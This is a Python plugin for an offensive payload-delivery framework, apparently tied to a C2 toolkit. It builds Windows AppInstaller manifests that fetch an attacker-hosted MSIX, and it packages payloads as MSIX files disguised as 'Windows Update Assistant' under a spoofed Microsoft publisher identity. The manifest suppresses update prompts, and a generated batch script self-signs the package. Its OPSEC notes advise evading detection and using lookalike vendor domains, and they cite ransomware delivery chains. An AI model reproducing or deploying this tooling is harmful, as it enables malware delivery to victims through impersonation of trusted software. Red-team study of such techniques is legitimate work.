"""
Erebus Plugin - MSIX / AppInstaller Container
Author: Whispergate
Description: Packages payload as an MSIX package or generates an AppInstaller
             manifest that fetches an MSIX from an attacker-controlled HTTPS host.

Two delivery modes:

  AppInstaller (default, recommended)
    - Generates a .appinstaller XML manifest pointing to attacker-hosted MSIX.
    - When the victim opens the manifest, Windows' App Installer fetches and
      installs the package automatically (zero-elevation, sideload-enabled targets)
      or with a single confirmation prompt (developer mode).
    - The MSIX itself is never embedded in the delivered file - only a URL pointer.
    - Sigless operation: manifest works without code signing for the .appinstaller
      itself; only the MSIX at the remote URL needs to be signed (self-signed works
      on sideload-enabled targets).

  MSIX (self-contained, Windows-side build)
    - Produces all files needed to build the MSIX via the Erebus.Helper on a
      Windows host with the Windows SDK (makeappx.exe + signtool.exe).
    - The MSIX is a ZIP-compatible archive with a specific structure.
    - Self-signed MSIX installs on targets with:
        • Developer Mode enabled (Win10/11 by default on dev workstations)
        • Sideloading enabled via MDM/GPO
        • Trusted publisher cert already in the device's cert store

Threat actor precedent: Magniber ransomware, TA505/FIN7 delivery chains.

## OPSEC Notes
Detection Surface:
  - appinstaller.exe (signed Windows binary) spawns child msiexec or app process
  - Network connection from appinstaller.exe to attacker HTTPS host
  - EventID 8027 / 8028: AppInstaller install attempt logged in Event Log
  - Sysmon Event 1: appinstaller.exe or AppInstaller child process
Behavioral Indicators:
  - appinstaller.exe making outbound HTTPS connection shortly after user interaction
  - MSIX install from non-Store source (Policy/MDM may block this)
Hardening:
  - Host MSIX on a CDN or cloud storage provider for infra blending
  - Use a domain matching the software being impersonated (e.g., "app.VENDORNAME.com")
  - Self-sign the MSIX cert with an issuer matching a legitimate software vendor
Evasion Maturity: Level 2 (Moderate) - appinstaller.exe is a LOLBAS but
  the delivery mechanism is relatively novel; EDR rules are still maturing.
"""

import pathlib
import struct
import time
import uuid
import zipfile
import io
from typing import Dict, Callable, List, Optional

try:
    from jinja2 import Template
    _JINJA2 = True
except ImportError:
    _JINJA2 = False

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_TEMPLATE_DIR = pathlib.Path(__file__).resolve().parents[2] / "agent_code" / "templates"


class MsixContainerPlugin(ErebusPlugin):
    """
    Plugin for generating MSIX packages and AppInstaller manifests.

    Primary output is a .appinstaller XML manifest (no Windows tools required,
    runs on Linux in the Mythic container). Full MSIX packaging is deferred
    to Erebus.Helper on Windows when `build_msix_structure` is requested.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT  = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.HELPER_DIR = self.AGENT_CODE / "Erebus.Helper"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="msix_container",
            version="1.0.0",
            author="Whispergate",
            description="Generates MSIX AppInstaller manifest + MSIX package structure for payload delivery",
            category=PluginCategory.CONTAINER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "build_appinstaller": self.build_appinstaller,
            "build_msix_structure": self.build_msix_structure,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        jinja = "available" if _JINJA2 else "missing (using string template)"
        print(f"[Plugin] MSIX Container plugin loaded - Jinja2: {jinja}")

    # ================================================================
    # AppInstaller manifest
    # ================================================================

    def build_appinstaller(
        self,
        build_path: pathlib.Path,
        msix_uri: str,
        output_filename: str = "setup.appinstaller",
        appinstaller_uri: str = "",
        # [MALLEABLE] Package identity - match software being impersonated
        package_name: str = "Microsoft.WindowsUpdate",
        # Publisher Distinguished Name - must match the signing cert CN
        publisher_dn: str = "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
        version: str = "1.0.0.0",
        arch: str = "x64",
    ) -> pathlib.Path:
        """
        Generate a .appinstaller XML manifest pointing to an attacker-hosted MSIX.

        The manifest is a plain XML file - no Windows tools required, generates
        fully on Linux. The attacker must separately host a signed MSIX at msix_uri
        (see build_msix_structure for the MSIX package files).

        Args:
            build_path:         Erebus build root directory.
            msix_uri:           Full HTTPS URL of the MSIX package on attacker infra.
                                Example: "https://cdn.example.com/update/app.msix"
            output_filename:    Output .appinstaller filename.
            appinstaller_uri:   URL where THIS manifest is hosted (optional; omit if
                                not using self-update scenarios).
            package_name:       MSIX Package Name field (visible in Settings > Apps).
            publisher_dn:       Publisher Distinguished Name matching the signing cert.
            version:            Package version string (must be x.x.x.x format).
            arch:               Target architecture: "x64" | "x86" | "neutral".

        Returns:
            pathlib.Path: Path to the generated .appinstaller file.
        """
        build_path = pathlib.Path(build_path)
        build_path.mkdir(parents=True, exist_ok=True)

        if not appinstaller_uri:
            appinstaller_uri = msix_uri.rsplit("/", 1)[0] + f"/{output_filename}"

        ctx = {
            "version":           version,
            "appinstaller_uri":  appinstaller_uri,
            "package_name":      package_name,
            "publisher_dn":      publisher_dn,
            "msix_uri":          msix_uri,
            "arch":              arch,
        }

        tpl_path = _TEMPLATE_DIR / "appinstaller.xml.j2"
        if _JINJA2 and tpl_path.exists():
            xml = Template(tpl_path.read_text(encoding="utf-8")).render(**ctx)
        else:
            xml = self._render_appinstaller_fallback(**ctx)

        output_path = build_path / output_filename
        output_path.write_text(xml, encoding="utf-8")
        return output_path

    @staticmethod
    def _render_appinstaller_fallback(
        version: str, appinstaller_uri: str, package_name: str,
        publisher_dn: str, msix_uri: str, arch: str,
    ) -> str:
        """String-format fallback when Jinja2 is not available."""
        return f"""<?xml version="1.0" encoding="utf-8"?>
<AppInstaller
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2018"
    Version="{version}"
    Uri="{appinstaller_uri}">

    <MainPackage
        Name="{package_name}"
        Publisher="{publisher_dn}"
        Version="{version}"
        Uri="{msix_uri}"
        ProcessorArchitecture="{arch}" />

    <UpdateSettings>
        <OnLaunch
            HoursBetweenUpdateChecks="0"
            ShowPrompt="false"
            UpdateBlocksActivation="false" />
    </UpdateSettings>

</AppInstaller>"""

    # ================================================================
    # MSIX package structure (Windows-side build via Erebus.Helper)
    # ================================================================

    def build_msix_structure(
        self,
        build_path: pathlib.Path,
        payload_files: List[pathlib.Path],
        package_name: str = "Microsoft.WindowsUpdate",
        publisher_dn: str = "CN=ErebusOperator",
        version: str = "1.0.0.0",
        arch: str = "x64",
        # [MALLEABLE] Display name shown in App Installer UI and Settings > Apps
        display_name: str = "Windows Update Assistant",
        description: str = "Windows Update package",
    ) -> pathlib.Path:
        """
        Build the MSIX directory structure and AppxManifest.xml.

        Produces a directory at build_path/msix_package/ containing:
          - AppxManifest.xml  (package identity, capabilities, entry point)
          - [Content_Types].xml
          - AppxBlockMap.xml  (populated by Erebus.Helper makeappx.exe call)
          - assets/           (payload files)
          - build_msix.bat    (operator runs this on Windows to create signed MSIX)

        The .appinstaller manifest is also generated pointing to a placeholder URI
        that the operator must update to their hosting URL.

        Args:
            build_path:     Erebus build root directory.
            payload_files:  Payload files to include in the MSIX assets/ folder.
            package_name:   MSIX package identity name (no spaces).
            publisher_dn:   Publisher Distinguished Name matching the signing cert.
            version:        Package version (x.x.x.x).
            arch:           Architecture: "x64" | "x86" | "neutral".
            display_name:   Friendly name shown in App Installer and Settings.
            description:    Package description string.

        Returns:
            pathlib.Path: Path to the msix_package/ directory.
        """
        build_path  = pathlib.Path(build_path)
        pkg_dir     = build_path / "msix_package"
        assets_dir  = pkg_dir / "assets"
        pkg_dir.mkdir(parents=True, exist_ok=True)
        assets_dir.mkdir(exist_ok=True)

        pkg_id   = str(uuid.uuid4()).replace("-", "")[:16].upper()
        entry_point = "assets\\erebus.exe"

        # Copy payload files into assets/
        for fp in payload_files:
            fp = pathlib.Path(fp)
            if fp.is_file():
                (assets_dir / fp.name).write_bytes(fp.read_bytes())

        # ---- AppxManifest.xml ----
        manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<Package
    xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10"
    xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10"
    xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities"
    IgnorableNamespaces="uap rescap">

  <Identity
      Name="{package_name}"
      Publisher="{publisher_dn}"
      Version="{version}"
      ProcessorArchitecture="{arch}" />

  <Properties>
    <DisplayName>{display_name}</DisplayName>
    <PublisherDisplayName>{publisher_dn.split('CN=')[-1].split(',')[0]}</PublisherDisplayName>
    <Logo>assets\\logo.png</Logo>
    <Description>{description}</Description>
  </Properties>

  <Dependencies>
    <TargetDeviceFamily Name="Windows.Desktop" MinVersion="10.0.17763.0" MaxVersionTested="10.0.19041.0" />
  </Dependencies>

  <Resources>
    <Resource Language="en-us" />
  </Resources>

  <Applications>
    <Application Id="{pkg_id}" Executable="{entry_point}" EntryPoint="Windows.FullTrustApplication">
      <uap:VisualElements
          DisplayName="{display_name}"
          Description="{description}"
          BackgroundColor="transparent"
          Square150x150Logo="assets\\logo.png"
          Square44x44Logo="assets\\logo.png" />
    </Application>
  </Applications>

  <Capabilities>
    <rescap:Capability Name="runFullTrust" />
  </Capabilities>

</Package>"""

        (pkg_dir / "AppxManifest.xml").write_text(manifest, encoding="utf-8")

        # ---- [Content_Types].xml ----
        content_types = """<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="exe"  ContentType="application/octet-stream"/>
  <Default Extension="dll"  ContentType="application/octet-stream"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Default Extension="png"  ContentType="image/png"/>
  <Override PartName="/AppxManifest.xml" ContentType="application/vnd.ms-appx.manifest+xml"/>
  <Override PartName="/AppxBlockMap.xml" ContentType="application/vnd.ms-appx.blockmap+xml"/>
</Types>"""

        (pkg_dir / "[Content_Types].xml").write_text(content_types, encoding="utf-8")

        # ---- Placeholder logo (1x1 transparent PNG) ----
        logo_png = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
            b'\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
            b'\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        (assets_dir / "logo.png").write_bytes(logo_png)

        # ---- build_msix.bat (operator runs on Windows) ----
        bat = f"""@echo off
REM Run this on a Windows host with the Windows SDK installed.
REM Requires: makeappx.exe, signtool.exe, and a code-signing certificate.
REM
REM Steps:
REM   1. Create a self-signed cert:
REM      New-SelfSignedCertificate -Type Custom -Subject "{publisher_dn}" ^
REM        -KeyUsage DigitalSignature -FriendlyName "ErebusSign" ^
REM        -CertStoreLocation "Cert:\\CurrentUser\\My" ^
REM        -TextExtension @("2.1.3.3={{text}}1.3.6.1.4.1.311.10.3.13")
REM   2. Export as PFX: (use Manage User Certificates snap-in → export)
REM   3. Run this batch file with paths set below.

SET MAKEAPPX="C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\makeappx.exe"
SET SIGNTOOL="C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\signtool.exe"
SET PFX_PATH=cert.pfx
SET PFX_PASS=password

%MAKEAPPX% pack /d . /p erebus.msix /o
%SIGNTOOL% sign /fd SHA256 /a /f %PFX_PATH% /p %PFX_PASS% erebus.msix
echo MSIX built and signed: erebus.msix
echo Upload erebus.msix to your hosting URL, then update the .appinstaller manifest URI.
"""
        (pkg_dir / "build_msix.bat").write_text(bat, encoding="utf-8")

        return pkg_dir


# Module-level instance for plugin auto-discovery
_plugin = MsixContainerPlugin()


if __name__ == "__main__":
    _meta = _plugin.get_metadata()
    print(f"[*] {_meta.name} v{_meta.version}")
    print(f"[*] Category: {_meta.category.value}")
    print(f"[*] Description: {_meta.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
